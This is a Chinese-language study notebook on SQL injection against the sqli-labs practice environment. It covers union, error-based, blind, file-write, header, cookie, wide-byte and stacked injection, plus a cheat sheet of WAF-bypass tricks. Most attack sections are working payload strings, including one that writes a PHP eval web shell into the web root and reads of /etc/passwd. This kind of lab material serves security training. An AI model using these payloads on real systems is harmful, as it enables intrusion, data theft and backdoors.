# SQL Injection（标准流程、报错注入、布尔型盲注、intooutfile注入、post注入、post报错、post盲注、post修改重置密码、http头注入、referer注入、cookie注入、waf注释符过滤、密码重置越权、waf屏蔽空格、unionselect屏蔽、宽字节注入、post宽字节注入、堆叠注入、绕过方法）





## 01标准流程（标准流程、MySQL的命令行语法、标准攻击步骤）



靶场：sqlilabs

使用工具：

PHPstudy

进入数据库的图形管理页面：

127.0.0.1/phpMyAdmin/index.php

用户名：root

密码：root

![image-20220114170928398](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114170928398.png)



### 复习SQL基础

#### **关于数据库**

新建数据库：

库名：haha

![image-20220114175346633](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114175346633.png)

新建数据表：

表名：table1

选择3个字段

![image-20220114175508562](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114175508562.png)

完善表：

名字：id、username、password

类型：int、varchar、varchar

将id作为网页的主件primary——索引：

![image-20220114175719157](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114175719157.png)

一个数据库有一个主件。

创建完毕后，可以插入数据：

![image-20220114175920289](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114175920289.png)



#### 使用php操作数据库：

在www目录下建立一个php目录文件haha.php：

```php
<?php
    
//连接数据库
$con = mysql_connect("localhost","root","root")

//测试连接
if(!$con){
	die('lian jie shi bai'.mysql_error());
}

mysql_select_db("haha",$con);

?>
//老版本写法
```

关于：`mysqli`和`mysql`，一个逐渐主流一个经典老方式

```php+HTML
//新版本写法
<?php 

$servername = "localhost";
$username = "root";
$password = "root";
//数据库库名
$dbname = "haha";

//创建连接
$con = new mysqli($servername,$username,$password,$dbname);

//测试连接
if($con->connect_error){
	die("wo si le :".$con->connect_error);
}

//查。【培养好习惯：参数小写，关键词大写】
$sql = "SELECT * FROM table1 WHERE id <10";

//执行sql语句并且返回结果到$result结果集
$result = $con->query($sql);
//一般是穷举
//所以需要去判断：
//如果数据库可以取得出东西
if($result->num_rows>0){
	//循环去查找result里所有内容，把result里的东西一条一条地取出来到row
	while($row = $result->fetch_assoc()){
		echo $row['username'].'--------'.$row['password'].'<br/>';
	}
}else{
	echo '数据库没东西';
}

//断开数据库连接
$con->close();

?>
```

```php+HTML
limit m,n         //指从m-1条开始列出n条
```

```php+HTML
<?php 

$servername = "localhost";
$username = "root";
$password = "root";
//数据库库名
$dbname = "haha";

//创建连接
$con = new mysqli($servername,$username,$password,$dbname);

//测试连接
if($con->connect_error){
	die("wo si le :".$con->connect_error);
}

//查
/*
$sql = "SELECT * FROM table1 WHERE id <10";

//执行sql语句并且返回结果到$result结果集
$result = $con->query($sql);

//如果数据库可以取得出东西
if($result->num_rows>0){
	//循环去查找result里所有内容
	while($row = $result->fetch_assoc()){
		echo $row['username'].'--------'.$row['password'].'<br/>';
	}
}else{
	echo '数据库没东西';
}
*/

//增
/*
$sql = "INSERT INTO table1(username,password) VALUES('test2','123111')";   //增加位置、内容

if($con->query($sql)===TRUE){
	echo "执行成功";     //注意用：UTF-8
}else{
	echo "执行失败";
}
*/

//改
/*
$sql = "UPDATE table1 SET password='niubi' WHERE username='test1'";     //更新地址、内容。注意双引号包裹单引号

if($con->query($sql)===TRUE){
	echo "执行成功";
}else{
	echo "执行失败";
}
*/

//删
/*
$sql = "DELETE FROM table1 WHERE username='test1' OR username='test2'";

if($con->query($sql)===TRUE){
	echo "执行成功";
}else{
	echo "执行失败";
}
*/

//断开数据库连接
$con->close();

?>
```



### 关于SQL注入的小知识——标准流程（本地尝试命令）

打开phpStudy_64\phpstudy_pro\Extensions\MySQL5.7.26\bin目录可以看到MySQL的程序

在此目录下，shift+右键，打开命令窗口（按W）。也可以在目录里输cmd。

#### MySQL的命令行语法：

```sql
mysql -u[用户名] -p[密码]
连接数据库

show databases;
查看数据库

use [数据库库名];
使用某个数据库

show tables;
查看库中有几张表

select * from table1;
查看table1中所有数据

union 联合

select * from table1 where id =1 union select 1,2,3;
左边右边同时执行

select * from table1 where id = -1 union select 1,2,3;
select * from table1 where id = 'x' union select 1,2,3;
如果左边出错，就执行右边

-1表示运行了之后没有结果，x表示出错，但'x'表示运行了之后没有结果——取决于primary的id的属性为int而不是varchar

\ 转义字符
会把自己后面的第一个字符当作字符串



注释符
--（后面有空格）但是，空格在网页提交里面是+
/**/
\#

limit 限制
limit [从哪个开始] [输出几个];
```

注意要用`;`表示结束

`x\'` === 字符串的`x'`



关于`id =1 union select 1,2,3;`和`select * from table1 where id = -1 union select 1,2,3;`

![image-20220114183738524](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114183738524.png)



### **攻击步骤：**

**靶场-less1为例**

http://.../Less-1/index.php?id=2

![image-20220114182841450](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114182841450.png)

让我们输入id：

![image-20220114182915872](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114182915872.pngg)



**步骤1：**

推断数据库语法大概是什么

```select * from [某个表] where id = [参数] limit 0,1;```

`select * from [某个表] where id = '2' limit 0,1;`

关于斜杠：

![image-20220114185933581](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114185933581.png)



**步骤2:**

让他报错，显示自己的闭合方式

select * from [某个表] where id = `'2\'` limit 0,1;

`1\'` LIMIT 0,1
`'` `"` `')` `")` `))` `"))` `'))` +没有闭合



**步骤3:**

验证目标的闭合方式
`select * from [某个表] where id = ' 2'--+ ' limit 0,1;`
执行之后
select * from [某个表] where id = ' 2'

如果执行成功，闭合方式就是你所想的`'`

![image-20220114191422861](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114191422861.png)



**步骤4:**

确定一下，多少个列
`select * from [某个表] where id = ' 2' order by 10 --+ ' limit 0,1;`
判断一下他是否有10列，如果有显示正常，如果没有就报错

通过二分法判断有多少列
`select * from [某个表] where id = ' 2' order by 3 --+ ' limit 0,1;`
不报错，所以有3列

![image-20220114191505266](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114191505266.png)

![image-20220114191512181](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114191512181.png)



**步骤5:**

使用联合查询
因为推断出有3列，所以union select 1,2,3
记住！前面的参数必须出错，否则后面的1，2，3报错位出不来

`id=-2' union select 1,2,3 --+`
出现报错位，分别为2，3

![image-20220114191627487](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114191627487.png)



**步骤6：**

开始刺探内部内容
id=-2' union select 1,database(),3 --+
输出数据库库名

输出库名为security

```
version()   #查看数据库版本号
user()     #查看用户
@@datadir  #查看物理路径，从而看到使用的操作系统
```



#### 数据库的小知识：

```
information_schema是自带的，相当于数据库户口本
information_schema的tables保存着所有数据库库名和表名的对应关系
information_schema的columns保存着库名--表名--列名所有对应关系
```

因此上述可修改为：

`id=-2' union select 1,table_name,3 from information_schema.tables where table_schema='security' limit 0,1 --+`
修改limit后面的参数即可得：
emails
referers
uagents
users

`id=-2' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+`

![image-20220114192623865](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114192623865.png)




**步骤7：**

查询表中的列
`id=-2' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+`

发现:id,username,password

![image-20220114192722372](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114192722372.png)



**步骤8：**

查询内容
`union select 1,group_concat(username),group_concat(password) from users --+`

![image-20220114192749186](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114192749186.png)



https://pypi.douban.com/simple/





## 02报错注入（随机漏洞小知识、报错注入前提和原理、利用rand漏洞报错、高效的报错注入）

判定结果有还是没有
会不会报错

**报错注入**

### MySQL本地操作-随机漏洞-小知识：

使用工具：

PHPstudy

![image-20220114170041578](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114170041578.png)

![image-20220114193338380](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114193338380.png)

![image-20220114194034379](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114194034379.png)



**本地测试-小知识：**

```
select count(*) from table1;
计算多少条数据

select rand();
生成随机数0到1

select floor(1.2);
向下取整为1

select floor(rand()*2);
生成0或1随机数

select floor(rand()*2)a;
取一个命令的别名：将select floor(rand()*2)这段命令取名为a

select * from table1 group by id;
以id来进行分组

select concat(1,2,3);
字符拼接

select password,count(*) as num from table1 group by password;
统计不同密码有多少个，统计数据命名为num，顺便按照password进行分组

0x3a      # :的意思

select concat('haha',0x3a,'nihao');
输出haha:nihao

select concat(0x3a,0x3a,(select database()),0x3a,0x3a)a;
::库名::

select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a;
```

![image-20220114195541612](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114195541612.png)

![image-20220114195624805](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114195624805.png)



```
select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns;
```

结果为无数个当前数据库的库名加随机的01和冒号



```
select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;
```

**存在漏洞**



```
select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;
```

![image-20220114200215497](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114200215497.png)

![image-20220114200337126](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114200337126.png)

![image-20220114200450050](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114200450050.png)

报错：因为随机，所以可能出现一个情况是`concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a`时可能全为0，而排列时`group by a`可能全为1的结果，因此无法排序

![image-20220114200542636](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114200542636.png)



```
select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) from information_schema.columns group by concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2));
```

效果相同。因为：

mysql官方说：rand函数每次出现都会重新计算一次。



总结MySQL漏洞1：

```
select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from table1;

select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns;

select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;

```

group by a是按a排序，a里只有0，1，并且随机！总有一天会出现2个0，2个1



### 实战：靶场less5

![image-20220114201109234](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114201109234.png)

进入靶场，猜测闭合方式：

![image-20220114201146937](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114201146937.png)

经过标准流程但是无法得到输出的报错位结果：

![image-20220114201218703](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114201218703.png)


### 使用报错注入前提和原理

那么思考：

关于报错注入：如果输入错误就会报错，如果输入正确会查数据库，但不显示东西——使用报错注入



### **利用rand()的报错漏洞**：

暴露库名：

```
id=1' AND (select 1 from (select count(*),concat((select database()),floor(rand()*2))a from information_schema.columns group by a)b) --+
```

```
id=1' AND (select 1 from (select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
```

![image-20220114201559006](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114201559006.png)



```
id=1' AND (select 1 from (select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
```



```
?id=1' AND (select 1 from (select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b) --+
```



hex不需要加任何东西

`0x3a`=`:`

`0x7e`=`~`



### 简单高效的报错注入：

利用extractvalue漏洞、updatexml

```
' and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+

' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+
```





## 03布尔型盲注（布尔型盲注、布尔型时间盲注：原理、本地操作、实战）

### 靶场less8

![image-20220114202400082](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114202400082.png)

尝试多次后发现无法得到闭合方式和报错位置

——盲注

#### 尝试：

```
?id=1    正常
?id=200000    不正常
?id=1\     不正常
?id=haha   不正常
```

因此可以估计：该数据库需要往里面传入一些不大不小的数字

```
?id=1' --+   正常
?id=1' and 0 --+    不正常
?id=1' and 1 --+   正常
```

得到结论：单引号闭合，且可以注入

```
?id=1' and 1<2 --+   正常
```

可以推出：可以输入一些长语句



### 布尔型盲注

boolean True/False

不显示错误，也不显示数据库的内容



#### 布尔型盲注-本地测试-小知识：

```
select database();
展示当前数据库库名

select length(database());
展示当前数据库库名的长度

select substr(database(),1,1);
截取数据库库名，从人类的第一个字，从第1个字开始取1个字

select ascii(substr(database(),1,1));
从第1个字开始取1个并且转化为ascii

select ascii(substr(database(),1,1))=104;
截取数据库库名第一个字，截取1个，转化为ascii码，判断是不是104
```



#### 实战：

```
?id=1' and (select ascii(substr(database(),1,1))< 120 )--+

?id=1' and (select ascii(substr(database(),1,1))= 115 )--+

?id=1' and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))= 115 )--+
```

注意加括号

### 布尔型时间盲注

界面上完全没有反应，但是你好像觉得可以注入

#### 本地测试-小知识：

```
select sleep(5);
数5s后输出0

select if((select database())="haha",sleep(5),null);
```

![image-20220114204713005](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114204713005.png)



#### 实战靶场less9：

依靠网站左上角是否转圈加载来判断是否可以实现注入

```
id=2' and sleep(5) --+
判断闭合方式

id=2' and if((select database())="security",sleep(5),null)--+

id=2' and if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e',sleep(5),null)--+
```







## 04 intooutfile注入（原理知识、变式利用）

### 实战靶场less7

易得闭合方式：id=-2'))

### 小知识

mysql配置文件my.ini里添加

```
secure_file_priv="/"
```

把取出的数据保存在某个文件中：

```
select * from table1 into outfile "c:/a.txt";

select * from table1 into outfile "/var/www/html/a.txt";
```

没有空格：

```
select * from table1 limit 0,1 into dumpfile "c:/a.txt";
```



加载某个文件并显示：

```
select load_file("/etc/passwd");
```

加载文件并转存：

```
select load_file("/etc/passwd") into outfile "/var/www/html/a.txt"
```



**Apache网站位置**：

/var/www/html/

旧版本：

/var/www/



**PHPstudy目录**：

c:/phpstudy_pro/WWW/Less-7/



后方生成的文件名每一次不能一样，否则无法访问

```
id=-2')) union select 1,database(),3 into outfile "/var/www/html/Less-7/zj1.txt"

id=-2')) union select 1,database(),3 into outfile "c:/phpstudy_pro/WWW/Less-7/zj1.txt"
```

然后直接访问本地文件：

![image-20220114210755551](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114210755551.png)



### 变式利用：

#### 可以使用一句话木马：

```
http://10.1.0.101/Less-7/?id=-2')) union select 1,'<?php @eval($_POST["CMD"])?>',3 into outfile "c:/phpstudy_pro/WWW/Less-7/zj1.php" --+
```

然后访问：

![image-20220114211208888](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114211208888.png)

![image-20220114211227208](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114211227208.png)



#### 使用load_file:

```
?id=-2')) union select 1,load_file('c:/flag.txt'),3 into outfile "c:/phpstudy_pro/WWW/Less-7/zj1.t" --+
```

![image-20220114211652598](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114211652598.png)









## 05 post注入（原理、实战、方法）

### 实战-靶场less12

post注入

使用神器burpsuite



猜测源码：

```
$u = $_POST['uname'];
$p = $_POST['passwd'];

select username,password from table1 where username=("$u") and password=("$p") limit 0,1;
```

因此可以通过让它报错猜测到闭合方式：

```
select username,password from table1 where username=("\") and password=("") limit 0,1;

判断为单引号闭合
\' and password='' LIMIT 0,1
```

### 第一种方式：

使用万能密码：

```
select username,password from table1 where username=' ' or 1=1 limit 1,1 #  ' and password='$p' limit 0,1;

select username,password from table1 where username=' admin' and 1=1 #

select username,password from table1 where username=' ' order by 2 #  ' and password='$p' limit 0,1;

select username,password from table1 where username=' ' union select 1,2 #  ' and password='$p' limit 0,1;

' and extractvalue(1,concat(0x7e,(select database()),0x7e)) #
```



### 第二种方式：

使用神器burpsuite

![image-20220114214701052](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114214701052.png)

抓包后：

![image-20220114214718244](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114214718244.png)

然后放行，到Repeater：

![image-20220114214852642](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114214852642.png)






## 06 post-报错、盲注、修改重置密码

### post报错

**靶场less-14**

```
" and extractvalue(1,concat(0x7e,(select database()),0x7e)) #

" and extractvalue(1,concat(0x7e,(select database()),0x7e)) and "1"="1
```



### post盲注

**靶场less-16**



判断闭合方式

```
") or 1=1 #
```

用户名和密码都写：

```
") or ("1")=("1
```

实际上是：

```
select username,password from table1 where username=("") or ("1")=("1") and password=("") or ("1")=("1") limit 0,1;
```



或：

```
") or sleep(5) #
") and sleep(5) #
```

也可以穷举：

```
admin") and sleep(5) #
```

也可以猜：

```
admin") and (select database()='security') #

admin") and if(ascii(substr(database(),1,1))=115,sleep(10),null) #
```

```
") or if(ascii(substr(database(),1,1))=115,sleep(10),null) #
```





布尔型盲注最好先猜出他们网站有什么用户名，以一个正确的用户名来当参照
admin") and (select database()='security') #





### post注入修改密码（危害性大，不建议做）

**靶场less-17**

![image-20220114222534038](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114222534038.png)



**sql语法里的“改”**:

```
update users set password='$pass' where username='Dumb';
```

推测闭合方式——使用万能密码——把密码改为空或者1

```
' or 1=1 #
```



```
update users set password='' or 1=1 #' where username='Dumb';

update users set password=1 
```






## 07 http头注入

### 靶场less18

![image-20220114223210217](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114223210217.png)

尝试提交查看网站基本状况。

得到自己查看网页的浏览器信息。——user-agent——http头注入

使用burpsuite



### http 头注入

user-agent = 浏览器信息

会记录用户数据到数据库。——与数据库有沟通——可能有漏洞

——“增删改查”里的“增”



根据经验猜测一下语法大致写法：

```
insert into 'security'.'uagents'('uagent','ip_address','username') values('浏览器信息','127.0.0.1','admin');

insert into ‘某个数据库’.'某个表'('浏览器信息','ip地址','用户名') values('浏览器信息','127.0.0.1','admin');
```

漏洞大多可能出现在：浏览器信息和admin的地方



那么：

![image-20220114224030876](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114224030876.png)

```
insert into 'security'.'uagents'('uagent','ip_address','username') values('\','127.0.0.1','admin');
```

破坏闭合就会导致报错：

![image-20220114224039635](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114224039635.png)

可以发现是'闭合。



但http头注入大多数情况下不能用注释符。

那么就考虑补全单引号：

```
values(' ' or '1'='1  ','127.0.0.1','admin');
```



```
' or '1'='1  

insert into 'security'.'uagents'('uagent','ip_address','username') values(' ' or '1'='1  ','127.0.0.1','admin');
```



```
' and extractvalue(1,concat(0x7e,(select database()),0x7e)) a '1'='1

insert into 'security'.'uagents'('uagent','ip_address','username') values(' ' and extractvalue(1,concat(0x7e,(select database()),0x7e)) or '1'='1  ','127.0.0.1','admin');
```






## 08 referer、cookie注入

### 靶场less19

使用burpsuite

简单测试一下：

![image-20220114224824240](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114224824240.png)

![image-20220114224937766](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114224937766.png)

### referer

referer= 来路信息（从哪个网站过来的）





尝试`\`：

![image-20220114225002465](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114225002465.png)



```
' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1
```





### 靶场less20

简单用admin登录测试：

![image-20220114225157771](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114225157771.png)

cookie 可能导致平行越权



### cookie

还是用`\`测试：

![image-20220114225455740](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114225455740.png)

得知单引号闭合。

注意cookie后面有`;`，因此我们操作需要在分号前操作。



```
' and extractvalue(1,concat(0x7e,(select database()),0x7e)) #

admin' and extractvalue(1,concat(0x7e,(select database()),0x7e)) #
```



### 靶场less21

base64加密过的cookie

利用神器解密：

![image-20220114225838024](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114225838024.png)



因此进行的操作需要进行base64（encode）加密再提交：



![image-20220114230000046](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220114230000046.png)

```
admin' and extractvalue(1,concat(0x7e,(select database()),0x7e)) #

再进行base64加密
```




##  09 waf注释符过滤

### 靶场less23

常规流程：`\`

发现单引号闭合

但是`--+`、`#`被过滤



waf防火墙过滤



有些语法比如insert等不能使用注释符不然可能导致语句不全

一般可以使用`-1'or '1'='1`

但是这里不行



猜测写法：

```
select * from users where id='-1' union select 1,2,'3 ' limit 0,1
```



那就可以使用`-1' union select 1,2,'3`让它闭合并且能成功运行





## 10 密码重置越权

### 靶场less24



猜测写法：

```
update users set password='$new_pass' where username="$user" and password="&old_pass";
```

 

那么可以得到漏洞可能出现在：

`where username="$user" and `输入的username里



那么如果注册用户名：

`admin' #`

```
update users set password='123' where username='admin'  and password="&old_pass";
```






## 11 waf屏蔽空格

### less25

正常流程

得到单引号闭合



测试

![image-20220115095125275](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/image-20220115095125275.png)

发现屏蔽了`and`和`or`



正则表达式里：

`or`与`/*!or*/`、`order`是不一样的



通过：

```
id=2' order by 3 --+
```

测试得到`der by`

防火墙把`or`删除屏蔽了——但凡侦测到，就替换为空。



因此可以使用双写嵌套法、大小写绕过、使用运算符`&&`和`||`、URL编码等绕过

【关于URL编码，电脑得到指令后会把它转换为URL编码然后再翻译】

【防火墙如果没有下达urldecode的命令，那么就会跳过非关键字去识别】



```
屏蔽and or
但凡侦测到了，直接替换为空

aandnd

&& ||

%26%26

id=1' || extractvalue(1,concat(0x7e,(select database()),0x7e))--+
```



```
id=1' || extractvalue(1,concat(0x7e,select(database()),0x7e)) 
```



### less26

屏蔽了空格

空格替代品：

`%09` 水平tab键

`%0a` 新建一行

`%0c` 新建一页

`%0d` return功能

`%0b` 垂直tab键

`%a0` 空格键

或者不要空格，用括号



屏蔽`or` `and` `空格` `\ --+ # /**/`

`?id=1' oorrder by 3 %26%26 '1`



```
id=1%27||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))||1=%27
```







## 12 union、select屏蔽

### less27

测试：

屏蔽了空格、负号、union、select

可以使用大小写、空格变换写法绕过

```
屏蔽 空格 - union select

/?id=10000000'%0buNion%0bsElect%0b1,2,3 ||  '1'='1

```




## 13 宽字节注入

### less32

输入的东西被它自己添加的`\`转义，通过我们自己添加`\`无法绕过

MySQL用gbk编码，把2个字符当做一个汉字存在【中国的网站】

因为urlencode(\')=%5c%27

`id=1%df\'`

用`%df'`让它成为：`%df%5c`变成一个汉字，这样就可以使`'`逃逸出来

可变化，不一定`%df`

```
宽字节注入

mysql用gbk编码，把2个字符当作一个汉字存在
%df吃掉\，因为urlencode(\')= %5c%27，如果前面加上%df，%df%5c是一个汉字,%27会独立出来

id=-2%df' union select 1,2,3 --+

```



## 14 post宽字节注入

### less34

post宽字节注入

去burpsuite里提交数据包，与直接前端提交不同。



```
重要！
在post情况下的宽字节注入，得直接在burp的post数据包中修改，因为前端提交的时候和直接在数据包中修改，前端的不会变成中文

uname=admi%df' union select 1,2 #&passwd=admin&submit=Submit
```





### 防御：

把数据库的编码方式改为Unicode





## 15 堆叠注入

### less38

PHPstudy

MySQL里`;`后面加上新的数据，那么它会新起一行，添加一条内容是新的数据。

用于已知其网站注册入口、SQL的结构等。

```
id=1';insert into users(username,password)values('zj123','xxxx') --+
```






## 16 一些绕过方法：

1.大小写绕过
`UniOn SeleCT`

2.双写绕过
`union seleselectct`

3.编码绕过
`'scurity' = 0x73637572697479`

4.注释符
`uni/**/on sel/**/ect`

5.空格绕过/**/

6.or and绕过
`and == &&
or == ||`

7.内联函数
`/!*select*/ 1,2,3`

[内联注释/**/则是注释指定部分]

8.<>绕过
`uni<>on`

9.屏蔽逗号
`select substr('security',1,3)`
`select substr('security' from 1 for 3)`

`union select 1,2,3`
`union select * from (select 1)a join (select 2)b join (select 3)c`

`limit 0,1`
`limit 0 offset 1`

10.sleep屏蔽
`and sleep(1)`
`and benchmark(100000000,1)`

11.group_concat屏蔽
`select group_concat('x','y')`
`select group_ws('','x','y')`

12.=屏蔽
`like rlike regexp <>`
`id =1' or '1' like '1`

13.POST屏蔽#
考虑使用-- a大部分情况可以当作#用
`uname=admin -- a&passwd=admin`

14.特殊符号过waf
`/*!50001 select * from users */`
这里的50001=如果数据库版本是5.00.01以上的版本，这个语句才会被执行

15.ip地址拦截
放在burp的数据包中的
`x-forward-for
x-remote-ip
x-originating-ip
x-remote-addr
x-real-ip`

16.修改资源，比如：

```
http://www.xx.com/sql.php?id=1
http://www.xx.com/sql.php/1.js?id=1
```






